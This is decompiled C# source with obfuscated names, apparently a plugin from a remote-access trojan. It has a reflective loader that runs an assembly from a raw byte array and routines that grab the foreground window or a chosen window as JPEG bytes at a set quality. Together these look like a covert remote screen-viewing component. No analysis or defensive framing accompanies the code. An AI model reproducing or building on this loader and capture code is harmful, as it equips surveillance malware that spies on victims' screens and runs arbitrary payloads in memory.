using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace n;

public class C
{
	public struct RECT
	{
		public int left;

		public int top;

		public int right;

		public int bottom;
	}

	public static byte[] Plug;

	public static object inv(ref byte[] F, ref string C, ref string S, ref object P)
	{
		Assembly assembly = Assembly.Load(F);
		MethodInfo method = assembly.GetType(C)!.GetMethod(S);
		object objectValue = RuntimeHelpers.GetObjectValue(Activator.CreateInstance(assembly.GetType(C)));
		return method.Invoke(RuntimeHelpers.GetObjectValue(objectValue), (object[])P);
	}

	public static Image Capture(ref int hwd)
	{
		//IL_00ef: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f5: Expected O, but got Unknown
		//IL_0161: Unknown result type (might be due to invalid IL or missing references)
		//IL_0167: Expected O, but got Unknown
		API.wd.ShowWindow(hwd, 5);
		Thread.Sleep(100);
		RECT lpRect = default(RECT);
		GetWindowRect((IntPtr)hwd, ref lpRect);
		string text = Conversions.ToString(lpRect.top) + Conversions.ToString(lpRect.right) + Conversions.ToString(lpRect.left) + Conversions.ToString(lpRect.bottom);
		string text2 = text;
		int i = 0;
		int num = default(int);
		for (int length = text2.Length; i < length; i++)
		{
			string text3 = Conversions.ToString(text2[i]);
			if (Operators.CompareString(text3, "-", false) == 0)
			{
				num++;
			}
		}
		if (num == 4)
		{
			int A = 2;
			API.wd.G(ref hwd, ref A);
			A = 1;
			API.wd.G(ref hwd, ref A);
			GetWindowRect((IntPtr)hwd, ref lpRect);
		}
		Size size = new Size(lpRect.right, lpRect.bottom);
		Bitmap val = new Bitmap(size.Width, size.Height);
		Graphics val2 = Graphics.FromImage((Image)(object)val);
		val2.CopyFromScreen(0, 0, -lpRect.left, -lpRect.top, size, (CopyPixelOperation)13369376);
		val2.Dispose();
		Image thumbnailImage = ((Image)val).GetThumbnailImage(((Image)val).get_Width(), ((Image)val).get_Height(), (GetThumbnailImageAbort)null, IntPtr.Zero);
		((Image)val).Dispose();
		Bitmap val3 = new Bitmap(lpRect.right - lpRect.left, lpRect.bottom - lpRect.top);
		Graphics val4 = Graphics.FromImage((Image)(object)val3);
		Rectangle rectangle = new Rectangle(0, 0, lpRect.right - lpRect.left, lpRect.bottom - lpRect.top);
		val4.DrawImage(thumbnailImage, rectangle, 0, 0, lpRect.right - lpRect.left, lpRect.bottom - lpRect.top, (GraphicsUnit)2);
		val4.Dispose();
		return ((Image)val3).GetThumbnailImage((int)Math.Round((double)((Image)val3).get_Width() / 2.0 + (double)((Image)val3).get_Width() / 6.0), (int)Math.Round((double)((Image)val3).get_Height() / 2.0 + (double)((Image)val3).get_Height() / 6.0), (GetThumbnailImageAbort)null, IntPtr.Zero);
	}

	public static byte[] Capture1(ref int q)
	{
		//IL_00a5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Expected O, but got Unknown
		//IL_00ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_0101: Unknown result type (might be due to invalid IL or missing references)
		//IL_0107: Expected O, but got Unknown
		//IL_0174: Unknown result type (might be due to invalid IL or missing references)
		//IL_017a: Expected O, but got Unknown
		IntPtr foregroundWindow = API.GetForegroundWindow();
		if (foregroundWindow == IntPtr.Zero)
		{
			MemoryStream memoryStream = new MemoryStream(sc.gc(ref q));
			return memoryStream.ToArray();
		}
		int num = default(int);
		switch (q)
		{
		case 0:
			num = 65;
			break;
		case 1:
			num = 60;
			break;
		case 2:
			num = 55;
			break;
		case 3:
			num = 50;
			break;
		case 4:
			num = 45;
			break;
		case 5:
			num = 40;
			break;
		case 6:
			num = 35;
			break;
		case 7:
			num = 30;
			break;
		case 8:
			num = 25;
			break;
		case 9:
			num = 20;
			break;
		case 10:
			num = 10;
			break;
		}
		EncoderParameters val = new EncoderParameters(1);
		val.get_Param()[0] = new EncoderParameter(Encoder.Quality, (long)num);
		ImageCodecInfo encoderInfo = sc.GetEncoderInfo("image/jpeg");
		RECT lpRect = default(RECT);
		GetWindowRect(foregroundWindow, ref lpRect);
		Size size = new Size(lpRect.right, lpRect.bottom);
		Bitmap val2 = new Bitmap(size.Width, size.Height);
		Graphics val3 = Graphics.FromImage((Image)(object)val2);
		val3.CopyFromScreen(0, 0, -lpRect.left, -lpRect.top, size, (CopyPixelOperation)13369376);
		val3.Dispose();
		Image thumbnailImage = ((Image)val2).GetThumbnailImage(((Image)val2).get_Width(), ((Image)val2).get_Height(), (GetThumbnailImageAbort)null, IntPtr.Zero);
		((Image)val2).Dispose();
		Bitmap val4 = new Bitmap(lpRect.right - lpRect.left, lpRect.bottom - lpRect.top);
		Graphics val5 = Graphics.FromImage((Image)(object)val4);
		Rectangle rectangle = new Rectangle(0, 0, lpRect.right - lpRect.left, lpRect.bottom - lpRect.top);
		val5.DrawImage(thumbnailImage, rectangle, 0, 0, lpRect.right - lpRect.left, lpRect.bottom - lpRect.top, (GraphicsUnit)2);
		val5.Dispose();
		MemoryStream memoryStream2 = new MemoryStream();
		((Image)val4).Save((Stream)memoryStream2, encoderInfo, val);
		return memoryStream2.ToArray();
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetDesktopWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetWindowDC(IntPtr hwnd);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowRect(IntPtr hwnd, ref RECT lpRect);
}
